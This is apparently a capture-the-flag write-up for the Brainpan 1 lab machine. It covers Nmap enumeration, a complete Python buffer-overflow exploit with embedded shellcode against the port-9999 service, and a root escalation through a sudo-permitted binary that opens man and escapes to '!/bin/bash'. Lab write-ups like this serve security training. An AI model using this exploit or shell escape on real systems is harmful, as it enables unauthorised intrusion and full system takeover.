# Brainpan 1
> Silver Garcia

# Enumeration
Nmap
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 13:07 EDT
Warning: 10.10.247.124 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.247.124
Host is up (0.21s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
340/tcp   filtered unknown
497/tcp   filtered retrospect
2009/tcp  filtered news
2967/tcp  filtered symantec-av
4002/tcp  filtered mlchat-proxy
5004/tcp  filtered avt-profile-1
5810/tcp  filtered unknown
8090/tcp  filtered opsmessaging
9290/tcp  filtered unknown
9999/tcp  open     abyss?
10000/tcp open     http          SimpleHTTPServer 0.6 (Python 2.7.3)
10002/tcp filtered documentum
15000/tcp filtered hydap
57797/tcp filtered unknown
```

Found /bin directory with dirb.
barinpan.exe found on that directory.

# Exploitation
Found buffer overflow on brainpain.exe binary which is the service that is running on port 9999.
Exploit:
```python
#!/usr/bin/env python3
import socket

ip = "10.10.247.124"
port = 9999
# bad_chars = "\x00"
# jmp_esp = "\xf3\x12\x17\x31"
prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90"*64
payload = ("\xda\xd8\xd9\x74\x24\xf4\xba\x9c\xdc\x50\x5e\x5b\x2b\xc9"
"\xb1\x12\x31\x53\x17\x03\x53\x17\x83\x77\x20\xb2\xab\xb6"
"\x02\xc4\xb7\xeb\xf7\x78\x52\x09\x71\x9f\x12\x6b\x4c\xe0"
"\xc0\x2a\xfe\xde\x2b\x4c\xb7\x59\x4d\x24\x42\x92\xa6\xac"
"\x3a\xa0\xb8\xcc\x8f\x2d\x59\x7c\x89\x7d\xcb\x2f\xe5\x7d"
"\x62\x2e\xc4\x02\x26\xd8\xb9\x2d\xb4\x70\x2e\x1d\x15\xe2"
"\xc7\xe8\x8a\xb0\x44\x62\xad\x84\x60\xb9\xae")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

# Privilege escalation
Can execute following binary as sudo:
```bash
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

Executing binary withou parameters"
```bash
puck@brainpan:/$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
Executing the binary with the parameter 'manual' might execute the command 'man' which can be used to escalate privileges using the following steps (Got from gtfobins):
1. Execute without parameters
```bash
puck@brainpan:/$ sudo /home/anansi/bin/anansi_util manual man   
sudo /home/anansi/bin/anansi_util manual man 
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
```

2. Add !/bin/bash and press enter
```bash
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man# whoami
whoami
root
```
